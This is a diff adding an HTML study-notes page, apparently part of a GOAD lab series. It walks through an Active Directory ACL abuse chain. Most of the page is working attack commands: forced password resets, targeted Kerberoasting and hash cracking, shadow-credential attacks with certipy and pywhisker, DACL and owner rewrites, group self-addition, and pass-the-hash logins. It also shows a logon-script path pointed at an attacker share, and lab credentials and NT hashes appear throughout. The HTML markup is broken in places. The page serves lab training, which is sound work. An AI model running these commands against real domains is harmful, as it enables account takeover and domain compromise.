@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Part 10 - ACL - Done - GOAD</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .article-image { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    pre { background: #1e1e1e; padding: 15px; border-radius: 8px; overflow-x: auto; }
+    code { font-family: 'Courier New', monospace; background: #2a2a2a; padding: 2px 6px; border-radius: 4px; }
+    pre code { background: none; padding: 0; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">GOAD Walkthrough</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show More</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Back to Overview</p>
+              <a href="./" class="contact-link">Study Notes</a>
+            </div>
+          </li>
+        </ul>
+        <div class="separator"></div>
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <nav class="navbar">
+        <ul class="navbar-list">
+          <li class="navbar-item"><a href="./" class="navbar-link ">Overview</a></li>
+          <li class="navbar-item"><a href="part-01.html" class="navbar-link ">P1 - reconnaissan...</a></li>
+          <li class="navbar-item"><a href="part-02.html" class="navbar-link ">P2 - Finding Users</a></li>
+          <li class="navbar-item"><a href="part-03.html" class="navbar-link ">P3 - Authenticate...</a></li>
+          <li class="navbar-item"><a href="part-04.html" class="navbar-link ">P4 - Network Pois...</a></li>
+          <li class="navbar-item"><a href="part-05.html" class="navbar-link ">P5 - ADCS - ESC1 ...</a></li>
+          <li class="navbar-item"><a href="part-06.html" class="navbar-link ">P6 - MSSQL - Done</a></li>
+          <li class="navbar-item"><a href="part-07.html" class="navbar-link ">P7 - Privilege es...</a></li>
+          <li class="navbar-item"><a href="part-08.html" class="navbar-link ">P8 - Lateral move...</a></li>
+          <li class="navbar-item"><a href="part-09.html" class="navbar-link ">P9 - Delegations ...</a></li>
+          <li class="navbar-item"><a href="part-10.html" class="navbar-link active">P10 - ACL - Done</a></li>
+          <li class="navbar-item"><a href="part-11.html" class="navbar-link ">P11 - Abusing Tru...</a></li>
+          <li class="navbar-item"><a href="part-12.html" class="navbar-link ">P12 - Having fun ...</a></li>
+        </ul>
+      </nav>
+
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Part 10 - ACL - Done</header>
+        <section class="about-text">
+          <ul>
+<li><strong>GOAD - part 10 - ACL - Done</strong></li>
+</ul>
+    
+    
+    Access privileges for resources in Active Directory Domain Services are usually granted through the use of an Access Control Entry (ACE). Access Control Entries describe the allowed and denied permissions for a principal (e.g. user, computer account) in Active Directory against a securable object (user, group, computer, container, organizational unit (OU), GPO and so on)
+    If an object's (called <strong>objectA</strong>) DACL features an ACE stating that another object (called <strong>objectB</strong>) has a specific right (e.g. <code>GenericAll</code>) over it (i.e. over <strong>objectA</strong>), attackers need to be in control of <strong>objectB</strong> to take control of <strong>objectA</strong>. 
+    The following abuses can only be carried out when running commands as the user mentioned in the ACE (<strong>objectB</strong>)
+    
+    <img src="images/image-271.png" alt="DACL abuse-dark.png" class="article-image" loading="lazy">
+    
+    <strong>GenericAll Rights on User</strong>
+    This privilege grants an attacker full control over a target user account. Once <code>GenericAll</code> rights are confirmed using the <code>Get-ObjectAcl</code> command, an attacker can:
+<ul>
+<li><strong>Change the Target's Password</strong>: Using <code>net user <username> <password> /domain</code>, the attacker can reset the user's password.</li>
+<li><strong>Targeted Kerberoasting</strong>: Assign an SPN to the user's account to make it kerberoastable, then use Rubeus and targetedKerberoast.py to extract and attempt to crack the ticket-granting ticket (TGT) hashes.</li>
+<li><strong>Targeted ASREPRoasting</strong>: Disable pre-authentication for the user, making their account vulnerable to ASREPRoasting.</li>
+</ul>
+</ul>
+</ul>
+    
+    <strong>GenericAll Rights on Group</strong>
+    This privilege allows an attacker to manipulate group memberships if they have <code>GenericAll</code> rights on a group like <code>Domain Admins</code>. After identifying the group's distinguished name with <code>Get-NetGroup</code>, the attacker can:
+<ul>
+<li>Add Themselves to the Domain Admins Group: This can be done via direct commands or using modules like Active Directory or PowerSploit.</li>
+</ul>
+</ul>
+</ul>
+    
+    **GenericAll / GenericWrite / Write on Computer/User
+    <em>*</em> Holding these privileges on a computer object or a user account allows for:
+<ul>
+<li><strong>Kerberos Resource-based Constrained Delegation</strong>: Enables taking over a computer object.</li>
+<li><strong>Shadow Credentials</strong>: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.</li>
+</ul>
+</ul>
+</ul>
+    
+    <strong>WriteProperty on Group</strong>
+    If a user has <code>WriteProperty</code> rights on all objects for a specific group (e.g., <code>Domain Admins</code>), they can:
+    <strong>Add Themselves to the Domain Admins Group</strong>: Achievable via combining <code>net user</code> and <code>Add-NetGroupUser</code> commands, this method allows privilege escalation within the domain.
+    
+    <strong>Self (Self-Membership) on Group</strong>
+    This privilege enables attackers to add themselves to specific groups, such as <code>Domain Admins</code>, through commands that manipulate group membership directly. 
+    Using the following command sequence allows for self-addition:
+    <code>net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain</code>
+    
+    <strong>WriteProperty (Self-Membership)</strong>
+    A similar privilege, this allows attackers to directly add themselves to groups by modifying group properties if they have the <code>WriteProperty</code> right on those groups. 
+    The confirmation and execution of this privilege are performed with:
+    
+    <code>Get-ObjectAcl -ResolveGUIDs | ? {$<em>.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $</em>.IdentityReference -eq "OFFENSE\spotless"}
+    net group "domain admins" spotless /add /domain</code>
+    
+    <strong>ForceChangePassword</strong>
+    Holding the <code>ExtendedRight</code> on a user for <code>User-Force-Change-Password</code> allows password resets without knowing the current password. Verification of this right and its exploitation can be done through PowerShell or alternative
+    command-line tools, offering several methods to reset a user's password, including interactive sessions and one-liners for non-interactive environments. 
+    The commands range from simple PowerShell invocations to using <code>rpcclient</code> on Linux, demonstrating the versatility of attack vectors.
+    
+    <code>Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
+    Set-DomainUserPassword -Identity delegate -Verbose
+    Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose</code>
+    
+    <code>rpcclient -U KnownUsername 10.10.10.192 setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'</code>
+    
+    ### <strong>WriteOwner on Group</strong>
+    
+    If an attacker finds that they have <code>WriteOwner</code> rights over a group, they can change the ownership of the group to themselves. This is particularly impactful when the group in question is <code>Domain Admins</code>, as changing ownership allows for broader control over group attributes and membership. The process involves identifying the correct object via <code>Get-ObjectAcl</code> and then using <code>Set-DomainObjectOwner</code> to modify the owner, either by SID or name.
+    
+    <code>Get-ObjectAcl -ResolveGUIDs | ? {$<em>.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $</em>.IdentityReference -eq "OFFENSE\spotless"}
+    Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
+    Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico</code>
+    
+    ### <strong>GenericWrite on User</strong>
+    
+    This permission allows an attacker to modify user properties. Specifically, with <code>GenericWrite</code> access, the attacker can change the logon script path of a user to execute a malicious script upon user logon. 
+    This is achieved by using the <code>Set-ADObject</code> command to update the <code>scriptpath</code> property of the target user to point to the attacker's script.
+    
+    <code>Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1”</code>
+    
+    ### GenericWrite on Computer
+    
+    With GenericWrite over a computer, you can write to the “msds-KeyCredentialLink” attribute. Writing to this property allows an attacker to create “Shadow Credentials” on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.
+    
+    Alternatively, you can perform a resource-based constrained delegation attack against the computer.
+    
+    <strong>GenericWrite on Group</strong>
+    With this privilege, attackers can manipulate group membership, such as adding themselves or other users to specific groups. This process involves creating a credential object, using it to add or remove users from a group, and verifying the membership changes with PowerShell commands.
+    
+    <code>$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
+    $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
+    Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
+    Get-DomainGroupMember -Identity "Group Name" | Select MemberName
+    Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose</code>
+    
+    <strong>WriteDACL + WriteOwner</strong>
+    Owning an AD object and having <code>WriteDACL</code> privileges on it enables an attacker to grant themselves <code>GenericAll</code> privileges over the object. This is accomplished through ADSI manipulation, allowing for full control over the object and the ability to modify its group memberships. Despite this, limitations exist when trying to exploit these privileges using the Active Directory module's <code>Set-Acl</code> / <code>Get-Acl</code> cmdlets.
+    
+    <code>$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
+    $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
+    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
+    $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
+    $ADSI.psbase.commitchanges()</code>
+    
+    <strong>Replication on the Domain (DCSync)</strong>
+    
+    The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. 
+    This powerful technique requires permissions like <code>DS-Replication-Get-Changes</code>, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller.
+    
+    ### Practice
+    
+    Let’s start by configuring the lab so we can do some ACL Abuses.
+    
+    ``<code>
+    sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-data.yml
+    sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-acl.yml
+    sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-relations.yml
+    sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook vulnerabilities.yml
+    
+    </code>`<code>
+    
+    <img src="images/image-272.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    # Enumeration
+    
+    Enumerating ACLs with Bloodhound-python UNIX-like
+    
+    Once we do have a valid user, we can use Bloodhound to enumerate.
+    
+    </code>bloodhound-python -c all -u 'tywin.lannister@sevenkingdoms.local' -p 'powerkingftw135' -ns 10.4.10.10 -d sevenkingdoms.local -dc kingslanding.sevenkingdoms.local<code>
+    
+    <img src="images/image-273.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Now let’s upload this information into Bloodhound and analyze it.
+    
+    ### Analysis
+    
+    we can use the following filter to find ACL configurations.
+    
+    </code>MATCH p=(u)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' and u.admincount=false and not tolower(u.name) contains 'key' RETURN p<code>
+    
+    ## sevenkingdoms.local ACL
+    
+    To start we will focus on the sevenkingdoms killchain of ACL by starting with tywin.lannister (password: powerkingftw135)
+    
+<ul>
+<li>The path here is :</li>
+<ul>
+<li>Tywin -> Jaime : Change password user</li>
+<li>Jaime -> Joffrey : Generic Write user</li>
+<li>Joffrey -> Tyron : WriteDacl on user</li>
+<li>Tyron -> small council : add member on group</li>
+<li>Small council -> dragon stone : write owner group to group</li>
+<li>dragonstone -> kingsguard : write owner to group</li>
+<li>kingsguard -> stannis : Generic all on User</li>
+<li>stannis -> kingslanding : Generic all on Computer</li>
+</ul>
+</ul>
+</ul>
+</ul>
+</ul>
+    
+    <img src="images/image-274.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Above we can see see all the rights each user hash to other and we will start by exploiting each permission during this lab.
+    
+    NOTE: Abusing ACL make change on the targets. Be sure to you know what you are doing if you try to exploit it during an audit.
+    
+    # <strong>ForceChangePassword on User (Tywin -> Jaime)</strong>
+    
+    It’s important to understand that this should be conducted carefully since this will change the user password that we do have permission to change password and user may get blocked since his password will be changed.
+    
+    <img src="images/image-275.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    As we can see above, user <strong>tywin.lannister</strong> has </code>ForceChangePassword<code> right to user <strong>jaime.lannister</strong>, let’s take advantage of this right.
+    
+    We execute the command and we get the prompt to add the new password. After that we can test the login with the new password on user <strong>jaime.lannister</strong>.
+    </code>net rpc password jaime.lannister -U 'sevenkingdoms.local/tywin.lannister%powerkingftw135' -S kingslanding.sevenkingdoms.local<code>
+    
+    </code>netexec smb 10.4.10.10 -u jaime.lannister -p 'pasdebraspasdechocolat' -d sevenkingdoms.local<code> 
+    
+    <img src="images/image-276.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Above we can see that were able to change user <strong>jaime.lannister’s</strong> password, testing login to the server using NetExec.
+    
+    # <strong>GenericWrite on User (Jaime -> Joffrey)</strong>
+    
+    Previously we were able to get access to user Jaime exploring <strong></code>ForceChangePassword<code></strong> right. the next step is to do an horizontal privilege escalation exploring <strong></code>GenericWrite<code></strong> from user Jaime to user Joffrey.
+    
+    <img src="images/image-277.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Because user <strong>jaime</strong> has <strong></code>GenericWrite<code></strong> on a User account, there are 3 possible techniques:
+    
+<ul>
+<li>Shadow Credentials (Windows Server 2016 +)</li>
+<li>Logon Script</li>
+<li>Targeted Kerberoasting (Normally the password has to be weak enough for the hash to be cracked or you really need to have a good wordlist)</li>
+</ul>
+</ul>
+</ul>
+    
+    ### Targeted Kerberoasting
+    
+    This abuse can be carried out when controlling an object that has a </code>GenericAll<code>, </code>GenericWrite<code>, </code>WriteProperty<code> or </code>Validated-SPN<code> over the target. 
+    A member of the <strong></code>Account Operator<code></strong> group usually has those permissions.
+    The attacker can add an SPN (</code>ServicePrincipalName<code>) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting.
+    The principle is simple. Add an SPN(Service Principal Name) to the user, ask for a (TGS)Ticket Granting Service, remove the SPN(Service Principal Name) on the user.
+    
+    <a href="http://targetedkerberoast.py/" target="_blank"></code>targetedKerberoast.py</a> -v -d sevenkingdoms.local -u 'jaime.lannister' -p 'pasdebraspasdechocolat' --request-user 'joffrey.baratheon'<code>
+    
+    <img src="images/image-278.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Once the Kerberoast hash is obtained, it can possibly be cracked to recover the account's password if the password used is weak enough.
+    
+    Now we can get the TGS and try to crack it using Hashcat.
+    </code>hashcat -m 13100 -a 0 TGS_hash.txt /usr/share/wordlists/rockyou.txt --force<code>
+    
+    <img src="images/image-279.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Using <strong></code>Hashcat<code></strong> we were able to crack the TGS hash and the password is <strong></code>1killerlion<code></strong>.
+    
+    ### <strong>Shadow Credentials</strong>
+    
+    The abuse of Key Trust for computer objects encompasses steps beyond obtaining a Ticket Granting Ticket (TGT) and the NTLM hash.
+    We can use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials, the Shadow Credentials attack can be easily achieved with <a href="https://github.com/ly4k/Certipy" target="_blank">Certipy</a>.
+    
+    </code>certipy shadow auto -u 'jaime.lannister@sevenkingdoms.local' -p 'pasdebraspasdechocolat' -account 'joffrey.baratheon’<code>
+    
+    <img src="images/image-280.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    The abuse of Key Trust for computer objects encompasses steps beyond obtaining a Ticket Granting Ticket (TGT) and the NTLM hash as we can see above.
+    NT hash for '<strong>joffrey.baratheon</strong>': </code>3b60abbc25770511334b3829866b08f1<code>
+    Saved credential cache to '<strong>joffrey.baratheon.ccache</strong>’
+    
+    ### <strong>Logon script</strong>
+    
+    <strong>A logon script is a script that is executed under the context of a given user when that user logs into a computer in an Active Directory environment.</strong> 
+    That bit about running as the user who logs in will be important later on. Logon scripts can be configured in Group Policy and/or through the scriptPath attribute in the user’s Active Directory profile.
+    
+    Logon scripts are great because they can be used to do all sorts of fun things like map file shares, add printers, update software, delete temp files, log login times, run commands, set background wallpapers, etc.
+    
+    We can use <a href="https://github.com/dinigalab/ldapsearch" target="_blank">ldapserach</a> and <a href="https://github.com/franc-pentest/ldeep" target="_blank">ldeep</a> to show the scriptpath ldap value.
+    
+    # <strong>WriteDacl on User (Joffrey -> Tyron)</strong>
+    
+    Owning an AD object and having </code>WriteDACL<code> privileges on it enables an attacker to grant themselves </code>GenericAll<code> privileges over the object. 
+    
+    We will now abuse the <strong></code>WriteDacl<code></strong> right that user <strong>joffrey.baratheon</strong> has on user <strong>tyron.lannister</strong>.
+    
+    <img src="images/image-281.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    We can also start by reading the rights <strong>Joffrey.lannister</strong> has on <strong>tyron.lannister</strong> using <a href="https://github.com/ThePorgs/impacket" target="_blank">dacledit.py</a> (an impacket fork from <strong>ShutDown</strong>)
+    <a href="http://dacledit.py/" target="_blank"></code>dacledit.py</a> -action 'read' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'<code>
+    
+    <img src="images/image-282.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    We can see above the <strong></code>WriteDACL<code></strong> right from user joffrey.baratheon to tyron.lannister on “<strong></code>Access mask<code></strong>” flag. Now let’s change it to “<strong>FullControll</strong>”
+    
+    <a href="http://dacledit.py/" target="_blank"></code>dacledit.py</a> -action 'write' -rights 'FullControl' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'<code>
+    
+    <img src="images/image-283.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Now let’s check it again.
+    <a href="http://dacledit.py/" target="_blank"></code>dacledit.py</a> -action 'read' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'<code>
+    
+    <img src="images/image-284.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Now we can see that we were able to change it to <strong></code>FullControl<code></strong>. From this <strong></code>FullControl<code></strong> we now do 3 different type of attacks.
+    
+<ul>
+<li>Kerberoasting Attack against tyron.lannister.</li>
+<li>Change tyron.lannister’s password</li>
+<li>Do a Shadow Credentials attack</li>
+</ul>
+</ul>
+</ul>
+    
+    We want to avoid changing user’s credentials on a pentesting, user can get locked out, so let’s go for the Shadow Credentials option where we can get tyron.lannister TGT and NT hash.
+    
+    </code>certipy shadow auto -u 'joffrey.baratheon@sevenkingdoms.local' -p '1killerlion' -account 'tyron.lannister'<code>
+    
+    <img src="images/image-285.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    [*] NT hash for 'tyron.lannister': </code>b3b3717f7d51b37fb325f7e7d048e998<code>
+    
+    Using <strong></code>NetExec<code></strong> we can test with we are able to login to the machine as user <strong></code>tyron.lannister<code></strong> using its hash as well, since we were not able to crack the hash.
+    
+    </code>netexec smb 10.4.10.10 -u 'tyron.lannister' -H 'b3b3717f7d51b37fb325f7e7d048e998'<code>
+    
+    <img src="images/image-286.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    We were able to login.
+    
+    # <strong>Add self on Group (Tyron -> Small Council)</strong>
+    
+    Now we will abuse the Right <strong></code>AddSelf<code></strong> that user <strong>tyron.lannister</strong> has over a group called <strong>Small Council</strong>
+    This privilege enables attackers to add themselves to specific groups,
+    
+    <img src="images/image-287.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Let’s start by using ldeep to find out the users DN(<strong>Distinguished Name</strong>)
+    
+    </code>ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.4.10.10 search '(sAMAccountName=tyron.lannister)' distinguishedname<code>
+    
+    </code>ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.4.10.10 search '(sAMAccountName=Small Council)' distinguishedname<code>
+    
+    <img src="images/image-288.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    We can see by comparing both DistinguishedName that users tyron.lannister have different DistinguishedName.
+    
+    Since user <strong>tyron.lannister</strong> has <strong></code>AddSelf<code></strong> assigned to the group <strong>Small Council</strong>, we can abuse this right and make <strong>tyron.lannister</strong> to be part of the group <strong>Small Council</strong>.
+    </code>ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.4.10.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=Small Council,OU=Crownlands,DC=sevenkingdoms,DC=local"<code>
+    
+    <img src="images/image-289.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    We can also check the group Small Council members by using the flag <strong></code>memberof<code></strong> as well.
+    
+    </code>ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.4.10.10 membersof 'Small Council’<code>
+    
+    <img src="images/image-290.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Voila, We were able to abuse it and <strong>tyron.lannister</strong> is now part of <strong>Small Council</strong> group.
+    
+    # <strong>AddMember on Group (Small Council -> dragonstone)</strong>
+    
+    By abusing the <strong></code>AddMembers<code></strong> permission with the <strong></code>Add-DomainGroupMember<code></strong> command, an attacker can add themselves or others to a domain group, potentially granting unauthorized access.
+    
+    <img src="images/image-291.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    As we were able to abuse the <strong></code>AddSelf<code></strong> right previously, the user <strong>tyron.lannister</strong> is now member of <strong>Small Council</strong> Group. <strong>Small Council</strong> group has <strong></code>AddMember<code></strong> rights to <strong>DragonStone</strong> Group, so we can also add <strong>tyron.lannister</strong> into <strong>DragonStone</strong> group as well.
+    
+    Let’s start by checking tyron.lannister and the DragonStone DistinguishedName.
+    </code>ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.4.10.10 search '(sAMAccountName=tyron.lannister)' distinguishedName<code>
+    
+    </code>ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.4.10.10 search '(sAMAccountName=Dragonstone)' distinguishedName<code>
+    
+    <img src="images/image-292.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Ok, now we can add tyron.lannister into DragonStone group.
+    
+    </code>ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.4.10.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=DragonStone,OU=Crownlands,DC=sevenkingdoms,DC=local"<code>
+    
+    <img src="images/image-293.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    User Tyron.lannister is now member of DragonStone group.
+    
+    # <strong>WriteOwner on Group (dragonstone -> kingsguard)</strong>
+    
+    <img src="images/image-294.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    As member of the group <strong>DragonStone</strong> user <strong>tyron.lannister</strong> and the group has <strong></code>WriteOwner<code></strong> right over <strong>KingsGuard</strong>, <strong>tyron.lannister</strong> can abuse this right and become KingsGuard group owner.
+    
+    We will use owneredit.py to enumerate <strong>Kingsguard</strong> group owner and also to change overpass ownership
+    
+    <a href="http://owneredit.py/" target="_blank"></code>owneredit.py</a> -action 'read' -target 'kingsguard' sevenkingdoms.local/tyron.lannister -hashes ':b3b3717f7d51b37fb325f7e7d048e998'<code>
+    
+    <img src="images/image-295.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    above we can see that  vagrant is the owner of KingsGuard group.
+    
+    Now we just need to abuse the right and become the owner of KingsGuard group.
+    
+    </code>owneredit.py -action 'write' -new-owner 'tyron.lannister' -target 'kingsguard' 'sevenkingdoms.local/tyron.lannister' -hashes ':b3b3717f7d51b37fb325f7e7d048e998'<code>
+    
+    <img src="images/image-296.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Voila, <strong>tyron.lannister</strong> is now the <strong>KingsGuard</strong>  group owner.
+    
+    Becoming the group owner allows you to change the group ACL(Access Control List) and assign GenericAll to the group. 
+    
+    </code>dacledit.py -action 'write' -rights 'FullControl' -principal tyron.lannister  -target 'kingsguard' 'sevenkingdoms.local'/'tyron.lannister' -hashes ':b3b3717f7d51b37fb325f7e7d048e998'<code>
+    
+    <img src="images/image-297.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Now that we were able to give <strong></code>GenericAll<code></strong> right to the <strong>KingsGuard</strong> group, we can now add <strong>tyron.lannister</strong> to the <strong>KingsGuard</strong> group.
+    
+    </code>ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://10.4.10.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=kingsguard,OU=Crownlands,DC=sevenkingdoms,DC=local"<code>
+    
+    <img src="images/image-298.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    Amazing, <strong>tyron.lannister</strong> is now membert of <strong>KingsGuard</strong> group.
+    
+    # <strong>GenericAll on user (kingsguard -> stannis)</strong>
+    
+    The GenericAll permission provides write access to all properties (add users to a group or reset the user’s password). <em>The right to read permissions on this object, write all the properties on  this object, and perform all validated writes to this object.</em>
+    
+    This is exactly what we will do here, we will abuse the <strong></code>GenericAll<code></strong> that <strong>KingsGuard</strong> Group has over user <strong>Stannis.Baratheon</strong>, since user <strong>Tyron.Lannister</strong> is already part of <strong>KingsGuard</strong>,  <strong>Tyron.Lannister</strong> has <strong></code>Full Control<code></strong>  on <strong>Stannis.Baratheon</strong>. 
+    
+    <img src="images/image-299.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    for this GenericAll abuse we will simply reset user’s password.
+    
+    UNIX Like:
+    
+    </code>net rpc password stannis.baratheon --pw-nt-hash -U 'sevenkingdoms.lcoal/tyron.lannister%b3b3717f7d51b37fb325f7e7d048e998' -S kingslanding.sevenkingdoms.local<code>
+    
+    We will user the password <strong></code>MrStark123<code></strong> for this.
+    
+    # <strong>GenericAll on Computer (Stannis -> kingslanding)</strong>
+    
+    Holding these privileges on a computer object or a user account allows for:
+    
+<ul>
+<li><strong>Kerberos Resource-based Constrained Delegation</strong>: Enables taking over a computer object.</li>
+<li><strong>Shadow Credentials</strong>: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.</li>
+</ul>
+</ul>
+</ul>
+    
+    But what if you can’t add a computer in the domain (more and more customers disable the ability for a simple user to add computer to the domains and this is a good practice from a security point of view), you can do a shadow credentials attack on the computer.
+    
+    If ADCS(<strong>Active Directory Certificate Service</strong>) is enabled on the domain, and we got write privilege on <strong></code>msDS-KeyCredentialLink<code></strong>, we can do the shadow credentials attack to get a direct access on the target account.
+    
+    Let’s user pywisker to check <strong></code>msDS-KeyCredentialLink<code></strong>.
+    
+    </code>python3 <a href="http://pywhisker.py/" target="_blank">pywhisker.py</a> -d 'sevenkingdoms.local' -u 'stannis.baratheon' -p 'MrStark123' --target 'kingslanding$' --action "list"<code>
+    
+    <img src="images/image-300.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    <strong>“Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute”,</strong>  this information doesn’t mean that we do not have the right permission on to read <strong>kingslanding$</strong> attribution, because we enumerated already that we do have <strong></code>GenericAll<code></strong> right on the machine. So it menas that <strong></code>msDS-KeyCredentialLink<code></strong> is really empty.
+    
+    For this attack we can use <a href="https://github.com/ly4k/Certipy" target="_blank">Certipy</a> or <a href="https://github.com/ShutdownRepo/pywhisker" target="_blank">Pywisker</a>. Let’s use Certipy for this attack.
+    
+    Previously the did a check with pywisker, now lets also use pywisker to do this Shadow Credential attack.
+    
+    </code>python3 <a href="http://pywhisker.py/" target="_blank">pywhisker.py</a> -d 'sevenkingdoms.local' -u 'stannis.baratheon' -p 'MrStark123' --target 'kingslanding$' --action "add"<code>
+    
+    <img src="images/image-301.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    We were able to do the Shadow Credential attack.
+    Now if we check the msDS-KeyCredentialLink again, we see that it’s not empty anymore.
+    
+    </code>python3 <a href="http://pywhisker.py/" target="_blank">pywhisker.py</a> -d 'sevenkingdoms.local' -u 'stannis.baratheon' -p 'MrStark123' --target 'kingslanding$' --action "list"<code>
+    
+    <img src="images/image-302.png" alt="Untitled" class="article-image" loading="lazy">
+    
+    We now have a new entry.
+    
+    The same Shadow Credential attack can be achieved with Certipy as well.
